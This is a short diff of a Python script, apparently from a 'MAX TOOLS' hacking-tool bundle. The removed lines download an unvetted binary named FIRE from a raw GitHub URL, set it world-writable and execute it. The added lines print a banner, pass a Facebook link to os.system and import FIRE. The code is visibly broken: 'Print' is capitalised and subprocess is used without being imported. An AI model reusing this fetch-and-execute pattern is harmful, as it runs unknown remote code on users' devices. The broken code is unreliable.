@@ -1,9 +1,7 @@
 import os,sys
-current_os=subprocess.check_output('uname -om',shell=True)
-if 'aarch64' in str(current_os):
-    if not os.path.isfile('FIRE'):
-        os.system('curl -L https://raw.githubusercontent.com/R1NKU1100/SEX/main/FIRE > FIRE')
-        os.system('chmod 777 FIRE && ./FIRE')
+Print(' WELCOME MAX TOOLS')
+os.system('https://www.facebook.com/M1ND.H4CK3R.69k')
+import FIRE
         
     
 
